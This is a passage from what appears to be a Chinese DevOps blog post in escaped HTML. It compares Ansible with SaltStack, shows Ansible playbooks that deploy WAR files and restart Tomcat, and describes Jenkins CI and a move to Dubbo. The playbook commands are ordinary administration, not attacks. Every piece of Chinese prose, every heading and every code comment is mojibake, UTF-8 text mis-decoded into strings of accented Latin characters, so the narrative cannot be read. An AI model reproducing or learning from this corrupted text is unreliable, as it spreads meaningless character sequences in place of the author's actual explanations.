href=&quot;#1-è‡ªèº«è¿ç»´&quot; class=&quot;headerlink&quot; title=&quot;1. è‡ªèº«è¿ç»´&quot;&gt;&lt;/a&gt;1. è‡ªèº«è¿ç»´&lt;/h6&gt;&lt;p&gt;&lt;code&gt;SaltStack&lt;/code&gt;éœ€è¦åœ¨&lt;code&gt;Masterå’ŒMinion&lt;/code&gt;ä¸»æœºå¯åŠ¨å®ˆæŠ¤è¿›ç¨‹ï¼Œè‡ªèº«éœ€è¦æ£€æµ‹å®ˆæŠ¤è¿›ç¨‹çš„è¿è¡ŒçŠ¶æ€ï¼Œå¢åŠ è¿ç»´æˆæœ¬ã€‚Ansibleå’Œè¿œç«¯ä¸»æœºä¹‹é—´çš„é€šä¿¡æ˜¯é€šè¿‡æ ‡å‡†SSHè¿›è¡Œï¼Œè¿œç¨‹ä¸»æœºä¸Šåªéœ€è¦è¿è¡ŒSSHè¿›ç¨‹å°±å¯ä»¥è¿›è¡Œè¿ç»´æ“ä½œï¼ŒSSHæ˜¯æœºæˆ¿ä¸»æœºä¸­ä¸€èˆ¬éƒ½å®‰è£…å’Œå¯åŠ¨çš„è¿›ç¨‹ï¼Œæ‰€ä»¥åœ¨Ansibleè¿›è¡Œè¿ç»´çš„æ—¶å€™åªéœ€è¦å…³æ³¨Ansibleä¸»æœºçš„è¿è¡ŒçŠ¶æ€ã€‚Ansibleå¯¹æœºæˆ¿è¿ç»´ä¸ä¼šå¢åŠ è¿‡å¤šçš„è¿ç»´æˆæœ¬ã€‚ä»å·¥å…·æœ¬èº«çš„è¿ç»´è§’åº¦æ¥è¯´ï¼Œ&lt;code&gt;Ansible&lt;/code&gt;è¦æ¯”SaltStackç®€å•å¾ˆå¤šã€‚&lt;/p&gt;
&lt;h6 id=&quot;2-ä½¿ç”¨è¯­æ³•&quot;&gt;&lt;a href=&quot;#2-ä½¿ç”¨è¯­æ³•&quot; class=&quot;headerlink&quot; title=&quot;2. ä½¿ç”¨è¯­æ³•&quot;&gt;&lt;/a&gt;2. ä½¿ç”¨è¯­æ³•&lt;/h6&gt;&lt;p&gt;&lt;code&gt;Ansible&lt;/code&gt;çš„&lt;code&gt;Playbook&lt;/code&gt;è¯­æ³•è¦æ¯”SaltStackçš„Stateè¯­æ³•å…·æœ‰æ›´å¥½çš„å¯è¯»æ€§ã€‚åœ¨ä½¿ç”¨çš„è¿‡ç¨‹ä¸­å‘ç°&lt;code&gt;Ansible&lt;/code&gt;åœ¨å®ç°loopçš„æ›´åŠ çš„ç®€æ´ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ç›¸å¯¹è·¯å¾„ã€‚&lt;/p&gt;
&lt;p&gt;åŒæ ·Ansibleçš„Notifyæ¨¡å—å’ŒHandleræ¨¡å—å®ç°çš„åŠŸèƒ½å’ŒSaltStackçš„watchå’Œmodule.waitçš„æ¨¡å—å®ç°åŠŸèƒ½ä¹Ÿç±»ä¼¼ï¼Œä¹Ÿæ¯”SaltStackè¦ç®€æ´æ˜äº†ã€‚&lt;/p&gt;
&lt;p&gt;æ€»ä¹‹ï¼Œ&lt;code&gt;Ansibleçš„å®‰å…¨æ€§èƒ½æ¯”SaltStackå¥½&lt;/code&gt;ï¼Œè‡ªèº«è¿ç»´ç®€å•ï¼Œä½¿ç”¨è¯­æ³•å¯è¯»æ€§æ›´å¼ºï¼Œè™½ç„¶åœ¨å“åº”é€Ÿåº¦æ–¹é¢ä¸å¦‚SaltStackï¼Œä½†æ˜¯åœ¨å¤§éƒ¨åˆ†åº”ç”¨åœºæ™¯ä¸‹Ansibleçš„å“åº”é€Ÿåº¦èƒ½æ»¡è¶³éœ€æ±‚ã€‚å› æ­¤ï¼Œåœ¨é‡‘èè¡Œä¸šçš„è‡ªåŠ¨åŒ–è¿ç»´ç³»ç»Ÿï¼ŒAnsibleå·¥å…·æ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚&lt;/p&gt;
&lt;p&gt;å¯¹åº”æ¨¡å— account.yml åœ¨Jenkinsè‡ªåŠ¨åŒ–å†™ä¸Šå˜é‡å¯¹åº”.ymlå‰ç¼€åç§°ã€‚&lt;br&gt;è¿™é‡Œä¾ç„¶è°ƒç”¨è„šæœ¬å»è·‘ã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;- hosts: tomcat-account_01&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  environment:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    LC_ALL: zh_CN.UTF-8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    LANG : zh_CN.UTF-8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  tasks:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name  : cpfile-account&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    copy  : src=/root/.jenkins/workspace/yjk_master/haozhuo/haozhuo-account/target/haozhuo-account.war dest=/root/java_war/haozhuo-account.war&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name  : restart&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    shell : /root/update/account.sh&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    async : 0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name  : shutdown&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    shell : /srv/tomcat/tomcat_account/bin/shutdown.sh&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    async : 0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name  : start&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    shell : &lt;span class=&quot;built_in&quot;&gt;chdir&lt;/span&gt;=/srv/tomcat/tomcat_account/bin nohup ./startup.sh &amp;amp;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    async : 0&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;2016å¹´6æœˆä»½åœ¨ansibleæ”¹è¿›ymlä»£ç è¯­æ³•ã€‚å»é™¤äº†æ¯å°æœåŠ¡å™¨æ–°å¢å‘å¸ƒè„šæœ¬ï¼Œè¿™ä¸ªè¿‡ç¨‹å¤ªè¿‡äºå¤æ‚ï¼Œç»Ÿä¸€ä¸€å°å‘å¸ƒæœºå¤„ç†å³å¯ã€‚&quot;&gt;&lt;a href=&quot;#2016å¹´6æœˆä»½åœ¨ansibleæ”¹è¿›ymlä»£ç è¯­æ³•ã€‚å»é™¤äº†æ¯å°æœåŠ¡å™¨æ–°å¢å‘å¸ƒè„šæœ¬ï¼Œè¿™ä¸ªè¿‡ç¨‹å¤ªè¿‡äºå¤æ‚ï¼Œç»Ÿä¸€ä¸€å°å‘å¸ƒæœºå¤„ç†å³å¯ã€‚&quot; class=&quot;headerlink&quot; title=&quot;2016å¹´6æœˆä»½åœ¨ansibleæ”¹è¿›ymlä»£ç è¯­æ³•ã€‚å»é™¤äº†æ¯å°æœåŠ¡å™¨æ–°å¢å‘å¸ƒè„šæœ¬ï¼Œè¿™ä¸ªè¿‡ç¨‹å¤ªè¿‡äºå¤æ‚ï¼Œç»Ÿä¸€ä¸€å°å‘å¸ƒæœºå¤„ç†å³å¯ã€‚&quot;&gt;&lt;/a&gt;2016å¹´6æœˆä»½åœ¨ansibleæ”¹è¿›ymlä»£ç è¯­æ³•ã€‚å»é™¤äº†æ¯å°æœåŠ¡å™¨æ–°å¢å‘å¸ƒè„šæœ¬ï¼Œè¿™ä¸ªè¿‡ç¨‹å¤ªè¿‡äºå¤æ‚ï¼Œç»Ÿä¸€ä¸€å°å‘å¸ƒæœºå¤„ç†å³å¯ã€‚&lt;/h4&gt;&lt;p&gt;è¿™é‡Œæˆ‘è´´å‡ºymlä»£ç  Jenkinsç›´æ¥è°ƒç”¨ç›¸åº”æ¨¡å—å‘å¸ƒï¼Œè‡ªç„¶ä¼šå»æ‰§è¡Œå¯¹åº”ymlä»£ç ã€‚æ¯å°æœåŠ¡å™¨ä¸éœ€è¦æ”¾å‘å¸ƒå›æ»šè„šæœ¬ã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;---&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;- hosts: all&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  environment:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;     LC_ALL: zh_CN.UTF-8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;     LANG : zh_CN.UTF-8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  vars:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#jenkins-æ‰“åŒ…ç›®å½•&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    TESTWAR: /root/java_war/haozhuo-family.war&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#ç”Ÿäº§ç¯å¢ƒä¸­é¡¹ç›®çš„tomcatæ‰€åœ¨çš„ä½ç½®&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    OLDHOME: /srv/tomcat/tomcat_family/webapps/ROOT&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#ç”Ÿäº§ç¯å¢ƒä¸­è€ç‰ˆæœ¬é¡¹ç›®æ‰€åœ¨webappså¤‡ä»½ç›®å½•çš„ä½ç½®&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    backupwebapps: /srv/tomcat/tomcat_family/warbackup&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#ä»jenkins-æ‰“åŒ…ç¯å¢ƒè·å–çš„æ–°ç‰ˆæœ¬waråŒ…æ‰€åœ¨çš„ä½ç½®&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    NEWWAR: /root/java_war/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#ç”Ÿäº§ç¯å¢ƒä¸­é¡¹ç›®waråŒ…çš„åå­—&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    WARNAME: haozhuo-family.war&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#killæœåŠ¡typeè·¯å¾„&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    DOWNFILE: /srv/tomcat/tomcat_family&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  tasks:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name: copy-war-file&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    copy: src=&amp;#123;&amp;#123; TESTWAR &amp;#125;&amp;#125; dest=&amp;#123;&amp;#123; NEWWAR &amp;#125;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name: mkdir-bakwar-file&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    file: path=&amp;#123;&amp;#123; backupwebapps &amp;#125;&amp;#125; state=directory owner=tomcat group=tomcat mode=755&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name: bakwar-file&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    shell: &lt;span class=&quot;string&quot;&gt;&quot;cp -r &amp;#123;&amp;#123; OLDHOME &amp;#125;&amp;#125; &amp;#123;&amp;#123; backupwebapps &amp;#125;&amp;#125;&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name: unzip war.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    unarchive: src=&amp;#123;&amp;#123; NEWWAR &amp;#125;&amp;#125;/&amp;#123;&amp;#123; WARNAME &amp;#125;&amp;#125; dest=&amp;#123;&amp;#123; OLDHOME &amp;#125;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name: stop-tomcat-service&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    shell: &lt;span class=&quot;string&quot;&gt;&quot;ps -ef |grep &amp;#123;&amp;#123; DOWNFILE &amp;#125;&amp;#125; |grep -v grep |awk &#39;&amp;#123;print &lt;span class=&quot;variable&quot;&gt;$2&lt;/span&gt;&amp;#125;&#39; |xargs kill -9&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ignore_errors: yes&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    async: 0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name: start-tomcat-service-nohup&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    shell: &lt;span class=&quot;built_in&quot;&gt;chdir&lt;/span&gt;=&amp;#123;&amp;#123; DOWNFILE &amp;#125;&amp;#125;/bin nohup ./startup.sh &amp;amp;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h6 id=&quot;3-æ€»ç»“&quot;&gt;&lt;a href=&quot;#3-æ€»ç»“&quot; class=&quot;headerlink&quot; title=&quot;3. æ€»ç»“&quot;&gt;&lt;/a&gt;3. æ€»ç»“&lt;/h6&gt;&lt;p&gt;åœ¨é‡‘èé¢†åŸŸä¸­ï¼Œå®‰å…¨æ˜¯æœ€é‡è¦çš„è€ƒè™‘å› ç´ ï¼Œåœ¨ä¼—å¤šè‡ªåŠ¨åŒ–è¿ç»´å·¥å…·ç§ï¼ŒAnsibleçš„å®‰å…¨æ€§èƒ½æœ€å¥½ï¼Œæ˜¯ç›®å‰æœ€é€‚åˆé‡‘èé¢†åŸŸçš„è‡ªåŠ¨åŒ–è¿ç»´å·¥å…·ã€‚æœ¬æ–‡é€šè¿‡å°†Ansibleå¾®æœåŠ¡åŒ–ï¼Œé›†æˆåˆ°è‡ªåŠ¨åŒ–è¿ç»´å¹³å°ä¸­ï¼Œå®ç°è‡ªåŠ¨åŒ–è¿ç»´å¹³å°é«˜å¹¶å‘æ‰§è¡Œè¿ç»´æ“ä½œåœºæ™¯å’Œå®æ—¶æ”¶é›†æ‰§è¡Œç»“æœã€‚&lt;/p&gt;
&lt;h4 id=&quot;2016å¹´7æœˆä»½Jenkinsä¸Šé¢å®ç°æŒç»­é›†æˆ&quot;&gt;&lt;a href=&quot;#2016å¹´7æœˆä»½Jenkinsä¸Šé¢å®ç°æŒç»­é›†æˆ&quot; class=&quot;headerlink&quot; title=&quot;2016å¹´7æœˆä»½Jenkinsä¸Šé¢å®ç°æŒç»­é›†æˆ&quot;&gt;&lt;/a&gt;2016å¹´7æœˆä»½Jenkinsä¸Šé¢å®ç°æŒç»­é›†æˆ&lt;/h4&gt;&lt;p&gt;è¿™é‡ŒJenkinsæ‰“é€šgitlabè‡ªåŠ¨å‘å¸ƒï¼Œå®¡è®¡ä»£ç ã€‚ è¿™é‡Œç»“åˆ&lt;code&gt;openVPN+è°·æ­ŒäºŒæ¬¡åŠ¨æ€è®¤è¯&lt;/code&gt;æ•ˆæœç»™äºˆå¼€å‘ä»–ä»¬å¼€æ”¾ç¯å¢ƒã€‚&lt;br&gt;æ¶æ„å›¾ ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/yjkjiagoutu2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;2016å¹´9æœˆä»½å…¬å¸æ¶æ„æ¼”å˜ä»ä¼ ç»Ÿæ¶æ„æ›´æ¢dubboæ¶æ„ã€‚&quot;&gt;&lt;a href=&quot;#2016å¹´9æœˆä»½å…¬å¸æ¶æ„æ¼”å˜ä»ä¼ ç»Ÿæ¶æ„æ›´æ¢dubboæ¶æ„ã€‚&quot; class=&quot;headerlink&quot; title=&quot;2016å¹´9æœˆä»½å…¬å¸æ¶æ„æ¼”å˜ä»ä¼ ç»Ÿæ¶æ„æ›´æ¢dubboæ¶æ„ã€‚&quot;&gt;&lt;/a&gt;2016å¹´9æœˆä»½å…¬å¸æ¶æ„æ¼”å˜ä»ä¼ ç»Ÿæ¶æ„æ›´æ¢dubboæ¶æ„ã€‚&lt;/h4&gt;&lt;p&gt;å…¬å¸åº”ç”¨æœåŠ¡æ¶æ„å›¾è¿™é‡Œè´´å‡ºæ¥ï¼š&lt;a href=&quot;http://shiyanjun.cn/archives/325.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Dubboæ¶æ„è®¾è®¡è¯¦è§£&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/jiagoutu2.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;ç³»ç»Ÿæ¶æ„å›¾è¿™é‡Œæˆ‘åæœŸåœ¨æ›´æ–°è´´å‡ºæ¥ã€‚&lt;/p&gt;
&lt;h4 id=&quot;2017å¹´3æœˆä»½-å…¬å¸æœåŠ¡å™¨150å°æœåŠ¡è‡ªåŠ¨åŒ–å‘å¸ƒã€‚&quot;&gt;&lt;a href=&quot;#2017å¹´3æœˆä»½-å…¬å¸æœåŠ¡å™¨150å°æœåŠ¡è‡ªåŠ¨åŒ–å‘å¸ƒã€‚&quot; class=&quot;headerlink&quot; title=&quot;2017å¹´3æœˆä»½ å…¬å¸æœåŠ¡å™¨150å°æœåŠ¡è‡ªåŠ¨åŒ–å‘å¸ƒã€‚&quot;&gt;&lt;/a&gt;2017å¹´3æœˆä»½ å…¬å¸æœåŠ¡å™¨150å°æœåŠ¡è‡ªåŠ¨åŒ–å‘å¸ƒã€‚&lt;/h4&gt;&lt;p&gt;åé¢è¿ç»´å¼€å‘å¼€å‘äº†ä¸€å¥—åŸºäºsaltè‡ªåŠ¨åŒ–ä¸€å¥—webç‰ˆçš„ç®¡ç†å¹³å°ã€‚å¯¹æˆ‘ä»¬åé¢çš„åšéƒ¨ç½²åˆå§‹åŒ–çš„ç¡®å‡è½»äº†å¾ˆå¤šã€‚&lt;br&gt;ç°åœ¨å¼€å§‹å…¬å¸ç”¨çš„æ˜¯ansibleåŸºpythonå¼€å‘å‡ºæ¥ä¸€å¥—è‡ªåŠ¨åŒ–éƒ¨ç½²çš„ã€‚å‘å¸ƒéƒ¨ç½²æµ‹è¯•ä¸€ä½“ç³»ï¼š&lt;br&gt;åˆšå¼€å‘å‡ºæ¥çš„æˆªäº†ä¸€å¼ å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/zidonhua1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;ä¸ªäººæ€»ç»“ï¼š&quot;&gt;&lt;a href=&quot;#ä¸ªäººæ€»ç»“ï¼š&quot; class=&quot;headerlink&quot; title=&quot;ä¸ªäººæ€»ç»“ï¼š&quot;&gt;&lt;/a&gt;ä¸ªäººæ€»ç»“ï¼š&lt;/h2&gt;&lt;h4 id=&quot;ç³»ç»Ÿæ ‡å‡†åŒ–ï¼š&quot;&gt;&lt;a href=&quot;#ç³»ç»Ÿæ ‡å‡†åŒ–ï¼š&quot; class=&quot;headerlink&quot; title=&quot;ç³»ç»Ÿæ ‡å‡†åŒ–ï¼š&quot;&gt;&lt;/a&gt;ç³»ç»Ÿæ ‡å‡†åŒ–ï¼š&lt;/h4&gt;&lt;p&gt;è¦æƒ³è‡ªåŠ¨åŒ–ï¼Œé¦–å…ˆç¬¬ä¸€å°±æ˜¯æ ‡å‡†åŒ–ã€‚æ¯”å¦‚è½¯ä»¶çš„&lt;code&gt;å®‰è£…ä½ç½®ã€ç‰ˆæœ¬ã€è„šæœ¬ï¼Œæ³¨å†Œ&lt;/code&gt;åˆ°init.dä¸‹é¢ï¼Œè¿™äº›åº”è¯¥æ˜¯æ ‡å‡†çš„ï¼Œæ‰€æœ‰æœåŠ¡å™¨éƒ½ç»Ÿä¸€çš„ã€‚æˆ–è€…è¯´ä½ ä½¿ç”¨saltå°±æ˜¯ä¸ºäº†è¾¾åˆ°è¿™æ ·çš„æ ‡å‡†åŒ–åšè‡ªåŠ¨åŒ–è¿ç»´è¦ç»å†çš„æ ‡å‡†åŒ–â€“&amp;gt;&amp;gt;è‡ªåŠ¨åŒ–â€”-&amp;gt;&amp;gt;æœåŠ¡åŒ–â€”-&amp;gt;&amp;gt;æ•°æ®åŒ–ã€‚&lt;/p&gt;
&lt;h4 id=&quot;ä¸ªäººæ„è§ï¼š&quot;&gt;&lt;a href=&quot;#ä¸ªäººæ„è§ï¼š&quot; class=&quot;headerlink&quot; title=&quot;ä¸ªäººæ„è§ï¼š&quot;&gt;&lt;/a&gt;ä¸ªäººæ„è§ï¼š&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;åªæœ‰æ ‡å‡†äº†ï¼Œæ‰èƒ½è‡ªåŠ¨ï¼Œè‡³å°‘ä½ ç›¸åŒçš„ä¸šåŠ¡éƒ½åº”è¯¥æ˜¯ä¸€æ ·çš„ã€‚&lt;/li&gt;
&lt;li&gt;è‡ªåŠ¨åŒ–ï¼Œè¿™ä¸ªè‡ªåŠ¨åŒ–è®²çš„æ˜¯å·¥å…·ï¼Œæ‰€æœ‰çš„æ“ä½œæ˜¯å·¥å…·å†åšï¼Œä¸æ˜¯äººã€‚ä¹Ÿæœ‰å°å…¬å¸è¯´æˆ‘ä»¬åŠè‡ªåŠ¨ï¼Œçš„ç¡®æ˜¯æœ‰çš„ï¼Œå°±å†™å†™è„šæœ¬ç„¶åé å·¥å…·å»ç®¡ç†ã€‚&lt;/li&gt;
&lt;li&gt;æœåŠ¡åŒ–ï¼Œä½ å¹³å°æçš„å¾ˆç‰›é€¼äº†ï¼Œç›´æ¥ç»™ä¸šåŠ¡æä¾›æ¥å£ã€‚DNSã€è´Ÿè½½å‡è¡¡ã€åˆ†å¸ƒå¼å­˜å‚¨ã€ä½ éƒ½å°è£…å¥½äº†ï¼Œä¸Šå±‚ä¸éœ€è¦å…³å¿ƒï¼Œä½ ç›¸å½“äºä¸ºä¸Šå±‚æœåŠ¡æä¾›æœåŠ¡ã€‚å„ç§APIéƒ½å†™å¥½äº†ã€‚&lt;/li&gt;
&lt;li&gt;æ•°æ®åŒ–ï¼Œæˆ–è€…è¯´å¯è§†åŒ–ï¼Œè¿ç»´å¹³å°åšçš„å¾ˆç‰›é€¼ï¼Œç›´æ¥å¯¹ä¸šåŠ¡è´Ÿè´£ï¼Œä»¥ä¸šåŠ¡ä¸ºå¯¼å‘ï¼Œä»Šå¤©è®¢å•é‡å‡å°‘äº†ï¼Œé€šè¿‡ä½ çš„è¿ç»´å¹³å°ï¼Œç›´æ¥å®šä½é—®é¢˜ï¼Œä¸éœ€è¦å„ç§æŸ¥æ‰¾ï¼Œå› ä¸ºè®¢å•é‡çš„å‡å°‘ï¼Œè‚¯å®šæœ‰ç›¸å…³çš„ç›‘æ§æŒ‡æ ‡å‘ç”Ÿå˜åŒ–ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;é‚£ä¹ˆåœ¨å·¥å…·è‡ªåŠ¨åŒ–å»ºè®¾çš„å¼€å§‹ï¼Œä½ éœ€è¦æœ‰ä¸€ä¸ªç†è®ºæ”¯æŒï¼Œæ¯”å¦‚ITILã€‚ä¸èƒ½çæã€‚æ²¡æœ‰æµç¨‹çš„è‡ªåŠ¨åŒ–è¿ç»´å°±æ˜¯è€æµæ°“å¦‚æœä¸Šçº¿æ²¡æœ‰èµ°ä¸Šçº¿æµç¨‹ï¼ŒåŠ¨ä¸åŠ¨ï¼Œå¼€å‘è‡ªå·±ç™»å½•æœåŠ¡å™¨æ‰§è¡Œäº†git pullã€‚é‚£è¿˜è‡ªåŠ¨åŒ–ä»€ä¹ˆå‘¢ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä¸ªäººçš„æ¦‚å¿µå°±æ˜¯ç”Ÿäº§å°±æ˜¯å’±ä»¬è¿ç»´çš„åœ°ç›˜ã€‚è°éƒ½ä¸èƒ½åŠ¨ã€‚å¼€å‘æƒ³åŠ¨ï¼Œä½ å¯ä»¥æä¾›æ¥å£ï¼Œæˆ–è€…æä¾›å¹³å°è®©å¼€å‘ç‚¹ç‚¹é¼ æ ‡å°±å¯ä»¥äº†ã€‚&lt;/p&gt;
&lt;h4 id=&quot;é¢˜å¤–è¯ï¼š&quot;&gt;&lt;a href=&quot;#é¢˜å¤–è¯ï¼š&quot; class=&quot;headerlink&quot; title=&quot;é¢˜å¤–è¯ï¼š&quot;&gt;&lt;/a&gt;é¢˜å¤–è¯ï¼š&lt;/h4&gt;&lt;p&gt;è¯´ä¸ªå¾ˆè›‹ç–¼çš„äº‹æƒ…ï¼Œä¹‹å‰åˆšæ¥è¿™è¾¹è´Ÿè´£åˆ›ä¸šå…¬å¸è¿ç»´å²—ä½ï¼ŒæŠ€æœ¯å›¢é˜Ÿå¼€å‘äººå‘˜éƒ½å¯ä»¥éšä¾¿è¦æƒé™ï¼Œç„¶åè§£å†³é—®é¢˜è¿ç»´ä¸ç”¨å‚ä¸éƒ½æ˜¯å¼€å‘å»æ“ä½œã€‚æ‰€ä»¥åæ¥æˆ‘è¿›é‚£å®¶åˆ›ä¸šå…¬å¸ä¹‹é—´æƒé™è¿™äº›éƒ½æ˜¯é¿å…äº†ã€‚ç»Ÿä¸€ç®¡ç†ï¼Œç»Ÿä¸€åˆ†é…ï¼Œä¸åŒéƒ¨é—¨ï¼Œä¸åŒå²—ä½ï¼Œä¸åŒæƒé™ã€‚ è¿™é‡Œæˆ‘å†™è¿‡ä¸€ç¯‡æ–‡ç« ï¼š&lt;code&gt;ä¸­å°å…¬å¸å‘˜å·¥ç»Ÿä¸€ç”¨æˆ·è®¤è¯æ–¹æ¡ˆ&lt;/code&gt;&lt;/p&gt;
